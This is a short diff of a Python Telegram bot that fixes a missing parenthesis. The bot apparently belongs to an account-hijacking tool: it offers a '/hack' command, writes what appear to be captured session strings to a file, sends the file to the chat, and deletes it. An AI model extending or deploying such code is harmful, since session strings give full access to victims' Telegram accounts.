@@ -509,7 +509,7 @@ async def users(event):
         return await event.reply("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY iq_u1"
+        file.write(i + "\n\nDetails BY iq_u1")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
